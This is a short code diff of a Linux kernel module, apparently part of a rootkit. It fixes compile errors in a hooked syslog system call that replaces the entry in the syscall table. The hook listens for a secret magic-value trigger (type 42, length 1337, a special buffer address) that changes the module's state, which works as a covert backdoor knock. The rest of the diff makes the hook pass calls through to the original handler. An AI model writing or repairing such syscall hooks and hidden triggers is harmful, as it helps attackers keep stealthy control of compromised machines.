@@ -59,14 +59,14 @@ noinline void skip_parent(void)
 
 #define syscalls ((void**)SM_sys_call_table)
 int (*asmlinkage old_syslog_func)(int type, char __user* buf, int len);
-asmlinkage int fake_syslog(int type, char __user* buf, int len);
+asmlinkage int fake_syslog(int type, char __user* buf, int len)
 {
-    if ((type == 42) && (len == 1337) && (buf == 0xabad1dea))
+    if ((type == 42) && (len == 1337) && (((uintptr_t)buf) == 0xabad1dea))
     {
 	((struct module*)(THIS_MODULE))->state = MODULE_STATE_LIVE;
     }
 
-    return old_syslog_func(fd, buf, count);
+    return old_syslog_func(type, buf, len);
 }
 
 static int postinit(void* data)
